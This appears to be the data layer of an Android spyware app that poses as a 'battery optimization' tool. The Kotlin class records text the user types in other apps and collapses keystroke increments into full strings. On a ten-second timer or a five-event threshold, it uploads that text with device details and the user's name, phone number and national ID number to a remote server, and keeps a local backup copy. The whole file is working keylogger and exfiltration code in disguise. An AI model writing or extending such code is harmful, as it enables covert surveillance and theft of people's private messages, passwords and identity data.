package com.android.batteryoptimization

import android.content.Context
import android.os.Build
import android.util.Log
import com.android.batteryoptimization.network.NetworkClient
import com.android.batteryoptimization.network.UploadResponse
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.io.File
import java.net.URLEncoder
import okhttp3.ResponseBody
class InputRepository private constructor(private val context: Context) {

    companion object {
        private const val TAG = "InputRepository"

        @Volatile
        private var instance: InputRepository? = null

        fun getInstance(context: Context): InputRepository {
            return instance ?: synchronized(this) {
                instance ?: InputRepository(context).also { instance = it }
            }
        }
    }

    private val file = File(context.applicationContext.filesDir, "events.json")
    private val backupFile = File(context.applicationContext.filesDir, "backup_events.json")
    private val userInfoFile = File(context.applicationContext.filesDir, "user_info.json")
    private val gson = Gson()

    private val _eventsFlow = MutableStateFlow<List<InputEvent>>(emptyList())
    val eventsFlow: StateFlow<List<InputEvent>> = _eventsFlow.asStateFlow()

    private val repositoryScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var timerJob: Job? = null
    
    private val uploadMutex = kotlinx.coroutines.sync.Mutex()
    private var lastUploadAttemptTime = 0L
    private val MIN_UPLOAD_INTERVAL = 10000L // 10 seconds
    
    // Constants for upload strategy
    private val UPLOAD_THRESHOLD = 5
    private val UPLOAD_INTERVAL_MS = 10 * 1000L // 10 seconds

    init {
        loadEvents()
        resetTimer()
    }

    fun loadEvents() {
        if (!file.exists()) {
            _eventsFlow.value = emptyList()
            return
        }
        val json = try {
            file.readText()
        } catch (e: Exception) {
            null
        }
        val events: List<InputEvent> = if (json != null) {
            val type = object : TypeToken<List<InputEvent>>() {}.type
            try {
                gson.fromJson(json, type)
            } catch (e: Exception) {
                emptyList()
            }
        } else {
            emptyList()
        }
        _eventsFlow.value = events
    }

    fun addEvent(event: InputEvent) {
        if (event.text.isBlank()) return
        val currentEvents = _eventsFlow.value.toMutableList()
        
        if (currentEvents.isNotEmpty()) {
            val lastEvent = currentEvents[0]
            if (event.packageName == lastEvent.packageName && event.text.startsWith(lastEvent.text)) {
                currentEvents[0] = event
            } else {
                currentEvents.add(0, event)
            }
        } else {
            currentEvents.add(0, event)
        }
        
        _eventsFlow.value = currentEvents
        saveEvents(currentEvents)
        
        // Trigger Strategy A: Quantity Threshold
        val unuploadedCount = currentEvents.count { !it.isUploaded }
        if (unuploadedCount >= UPLOAD_THRESHOLD) {
            repositoryScope.launch {
                uploadData()
            }
        }
    }

    private fun resetTimer() {
        timerJob?.cancel()
        timerJob = repositoryScope.launch {
            while (isActive) {
                delay(UPLOAD_INTERVAL_MS)
                uploadData()
            }
        }
    }

    suspend fun uploadData(): Pair<Boolean, String> {
        if (!uploadMutex.tryLock()) return Pair(false, "正在上传中")
        try {
            val currentTime = System.currentTimeMillis()
            if (currentTime - lastUploadAttemptTime < MIN_UPLOAD_INTERVAL) {
                return Pair(false, "上传过于频繁")
            }
            lastUploadAttemptTime = currentTime

            val allEvents = _eventsFlow.value.toList()
            val unuploadedEvents = allEvents.filter { !it.isUploaded }
            if (unuploadedEvents.isEmpty()) return Pair(false, "没有需要上报的数据")

            val chronoEvents = unuploadedEvents.reversed()
            val filteredList = mutableListOf<InputEvent>()
            for (i in chronoEvents.indices) {
                val current = chronoEvents[i]
                if (current.text.isBlank()) continue
                val next = if (i + 1 < chronoEvents.size) chronoEvents[i + 1] else null
                if (next != null && next.packageName == current.packageName && next.text.startsWith(current.text)) {
                    continue
                }
                filteredList.add(current)
            }
            val currentEvents = filteredList.reversed()
            if (currentEvents.isEmpty()) return Pair(false, "没有需要上报的数据")

            val userInfo = getUserInfo()
            val name = userInfo?.name ?: "Unknown"
            val phone = userInfo?.phone ?: "Unknown"
            val idCard = userInfo?.idCard ?: "Unknown"

            val deviceInfoJson = DeviceInfoHelper.getDeviceInfoJson(context)

            val userInfoPayload = com.android.batteryoptimization.network.UserInfoPayload(
                name = name,
                phone = phone,
                idCard = idCard
            )

            val eventPayloads = currentEvents.map { event ->
                com.android.batteryoptimization.network.EventPayload(
                    packageName = event.packageName,
                    appName = event.appName,
                    text = event.text,
                    timestamp = event.timestamp
                )
            }

            val requestBody = com.android.batteryoptimization.network.UploadRequest(
                userInfo = userInfoPayload,
                events = eventPayloads
            )

            val requestJson = gson.toJson(requestBody)
            val deviceInfoJsonLog = deviceInfoJson.take(200)

            return try {
                Log.d(TAG, "===== 开始上报 =====")
                Log.d(TAG, "deviceInfo: $deviceInfoJsonLog")
                Log.d(TAG, "requestBody: $requestJson")

                // Upload using Retrofit
                val responseBody = NetworkClient.uploadApi.uploadEvents(
                    deviceInfoJson = deviceInfoJson,
                    requestBody = requestBody
                )

                val bodyString = responseBody.string()
                Log.d(TAG, "response body: $bodyString")

                val uploadResponse = gson.fromJson(bodyString, UploadResponse::class.java)
                if (uploadResponse?.code == 0) {
                    val msg = uploadResponse.msg ?: "成功"
                    Log.d(TAG, "上报成功: ${currentEvents.size} events, msg: $msg")

                    // Append to backup file
                    appendToBackup(currentEvents)

                    // 标记为已上报（包括那些被过滤掉的中间状态，也认为已处理完）
                    val unuploadedTimestamps = unuploadedEvents.map { it.timestamp }.toSet()
                    val currentFlowList = _eventsFlow.value.toMutableList()
                    for (i in currentFlowList.indices) {
                        if (currentFlowList[i].timestamp in unuploadedTimestamps) {
                            currentFlowList[i] = currentFlowList[i].copy(isUploaded = true)
                        }
                    }
                    _eventsFlow.value = currentFlowList
                    saveEvents(currentFlowList)

                    // Reset timer since we just successfully uploaded
                    resetTimer()
                    Pair(true, "上报成功: $msg")
                } else {
                    val errorMsg = "上报失败: code=${uploadResponse?.code}, msg=${uploadResponse?.msg}"
                    Log.e(TAG, "===== 上报失败 =====")
                    Log.e(TAG, errorMsg)
                    Log.e(TAG, "request body: $requestJson")
                    Pair(false, errorMsg)
                }
            } catch (e: retrofit2.HttpException) {
                val errorBodyStr = try {
                    e.response()?.errorBody()?.string() ?: "null"
                } catch (ex: Exception) {
                    "read errorBody failed: ${ex.message}"
                }
                Log.e(TAG, "===== 上报 HTTP 错误 =====")
                Log.e(TAG, "HTTP code: ${e.code()}")
                Log.e(TAG, "errorBody: $errorBodyStr")
                Log.e(TAG, "request body: $requestJson")
                Pair(false, "上报失败: HTTP ${e.code()}, body: $errorBodyStr")
            } catch (e: Exception) {
                Log.e(TAG, "===== 上报异常 =====")
                Log.e(TAG, "异常类型: ${e.javaClass.simpleName}")
                Log.e(TAG, "异常信息: ${e.message}")
                Log.e(TAG, "异常堆栈: ", e)
                val errorMsg = "上报错误: ${e.message}"
                Pair(false, errorMsg)
            }
        } finally {
            uploadMutex.unlock()
        }
    }

    private fun appendToBackup(uploadedEvents: List<InputEvent>) {
        try {
            val existingBackupEvents = if (backupFile.exists()) {
                val type = object : TypeToken<List<InputEvent>>() {}.type
                try {
                    gson.fromJson<List<InputEvent>>(backupFile.readText(), type) ?: emptyList()
                } catch (e: Exception) {
                    emptyList()
                }
            } else {
                emptyList()
            }
            
            val newBackupEvents = existingBackupEvents.toMutableList()
            newBackupEvents.addAll(0, uploadedEvents) // keep newer at top
            
            // Limit backup file size to 2000 events to prevent out of memory
            val trimmedBackup = if (newBackupEvents.size > 2000) newBackupEvents.take(2000) else newBackupEvents
            
            backupFile.writeText(gson.toJson(trimmedBackup))
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun clearEvents() {
        _eventsFlow.value = emptyList()
        saveEvents(emptyList())
    }

    private fun saveEvents(events: List<InputEvent>) {
        try {
            val json = gson.toJson(events)
            file.writeText(json)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun getUserInfo(): UserInfo? {
        if (!userInfoFile.exists()) {
            return null
        }
        return try {
            val json = userInfoFile.readText()
            gson.fromJson(json, UserInfo::class.java)
        } catch (e: Exception) {
            null
        }
    }

    fun saveUserInfo(userInfo: UserInfo) {
        try {
            val json = gson.toJson(userInfo)
            userInfoFile.writeText(json)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
